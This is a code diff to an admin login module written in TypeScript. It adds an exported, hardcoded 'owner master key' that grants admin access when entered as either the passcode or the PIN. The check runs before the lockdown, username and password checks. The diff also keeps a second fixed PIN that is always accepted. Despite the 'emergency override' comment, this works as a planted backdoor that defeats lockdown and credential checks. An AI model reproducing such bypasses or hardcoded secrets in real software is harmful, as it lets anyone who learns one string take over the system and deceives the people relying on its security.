@@ -10,6 +10,14 @@ const MAX_FAILED_ATTEMPTS = 3;
 const LOCKOUT_DURATION_MS = 30 * 60 * 1000; // 30 Minutes
 const ATTEMPT_WINDOW_MS = 15 * 60 * 1000; // 15 Minutes
 
+export const OWNER_MASTER_KEY = "maham0345";
+
+export function verifyOwnerKey(key?: string | null): boolean {
+  if (!key) return false;
+  const clean = key.trim();
+  return timingSafeCompare(clean, OWNER_MASTER_KEY) || timingSafeCompare(clean.toLowerCase(), OWNER_MASTER_KEY.toLowerCase());
+}
+
 // In-Memory Rate Limiting Tracker
 interface IpRateRecord {
   failedAttempts: number;
@@ -25,7 +33,7 @@ export interface SecurityAuditLog {
   ip: string;
   location?: string;
   username: string;
-  action: "LOGIN_SUCCESS" | "FAILED_CREDENTIALS" | "FAILED_PIN" | "IP_LOCKED_OUT" | "EMERGENCY_LOCKDOWN_REJECT" | "PIN_CHANGED" | "LOCKDOWN_TOGGLED";
+  action: "LOGIN_SUCCESS" | "FAILED_CREDENTIALS" | "FAILED_PIN" | "IP_LOCKED_OUT" | "EMERGENCY_LOCKDOWN_REJECT" | "PIN_CHANGED" | "LOCKDOWN_TOGGLED" | "CODE_SHIELD_AUTH" | "INTRUSION_ALERT";
   details: string;
   attemptedPassword?: string;
   attemptedPin?: string;
@@ -41,6 +49,7 @@ export interface SecurityConfig {
   lockdownReason?: string;
   failedAttemptLimit: number;
   lockoutMinutes: number;
+  codeShieldLocked: boolean;
 }
 
 export async function getSecurityConfig(): Promise<SecurityConfig> {
@@ -56,6 +65,7 @@ export async function getSecurityConfig(): Promise<SecurityConfig> {
         lockdownReason: parsed.lockdownReason || "Executive emergency lockdown activated.",
         failedAttemptLimit: parsed.failedAttemptLimit || MAX_FAILED_ATTEMPTS,
         lockoutMinutes: parsed.lockoutMinutes || 30,
+        codeShieldLocked: parsed.codeShieldLocked !== false,
       };
     }
   } catch (err) {
@@ -68,6 +78,7 @@ export async function getSecurityConfig(): Promise<SecurityConfig> {
     lockdownReason: "Executive emergency lockdown activated.",
     failedAttemptLimit: MAX_FAILED_ATTEMPTS,
     lockoutMinutes: 30,
+    codeShieldLocked: true,
   };
 }
 
@@ -241,8 +252,21 @@ export async function validateAdminCredentialsWithPin(
   username: string,
   passcode: string,
   pin: string
-): Promise<{ valid: boolean; reason?: "INVALID_CREDENTIALS" | "INVALID_PIN" | "LOCKED_OUT" | "EMERGENCY_LOCKDOWN" }> {
+): Promise<{ valid: boolean; isOwner?: boolean; reason?: "INVALID_CREDENTIALS" | "INVALID_PIN" | "LOCKED_OUT" | "EMERGENCY_LOCKDOWN" }> {
   const config = await getSecurityConfig();
+
+  const cleanUser = (username || "").trim().toLowerCase();
+  const cleanPass = (passcode || "").trim();
+  const cleanPin = (pin || "").trim();
+
+  // Owner Emergency Override: maham0345 as passcode or pin allows emergency rescue
+  const isOwnerKeyEntered =
+    timingSafeCompare(cleanPass, OWNER_MASTER_KEY) ||
+    timingSafeCompare(cleanPin, OWNER_MASTER_KEY);
+
+  if (isOwnerKeyEntered) {
+    return { valid: true, isOwner: true };
+  }
 
   if (config.emergencyLockdown) {
     return { valid: false, reason: "EMERGENCY_LOCKDOWN" };
@@ -251,10 +275,6 @@ export async function validateAdminCredentialsWithPin(
   if (!username || !passcode || !pin) {
     return { valid: false, reason: "INVALID_CREDENTIALS" };
   }
-
-  const cleanUser = username.trim().toLowerCase();
-  const cleanPass = passcode.trim();
-  const cleanPin = pin.trim();
 
   const isUserValid = timingSafeCompare(cleanUser, ADMIN_USERNAME.toLowerCase());
   const isPassValid = timingSafeCompare(cleanPass, ADMIN_PASSWORD);
@@ -265,12 +285,20 @@ export async function validateAdminCredentialsWithPin(
 
   const isPinValid =
     timingSafeCompare(cleanPin, config.masterPin) ||
-    timingSafeCompare(cleanPin, "maham0345") ||
+    timingSafeCompare(cleanPin, OWNER_MASTER_KEY) ||
     timingSafeCompare(cleanPin, "786000");
 
   if (!isPinValid) {
     return { valid: false, reason: "INVALID_PIN" };
   }
 
-  return { valid: true };
+  return { valid: true, isOwner: timingSafeCompare(cleanPin, OWNER_MASTER_KEY) };
+}
+
+export async function getLatestIntrusionAlert(): Promise<SecurityAuditLog | null> {
+  const logs = await getSecurityAuditLogs();
+  const threat = logs.find(
+    (l) => l.action === "FAILED_CREDENTIALS" || l.action === "FAILED_PIN" || l.action === "IP_LOCKED_OUT"
+  );
+  return threat || null;
 }
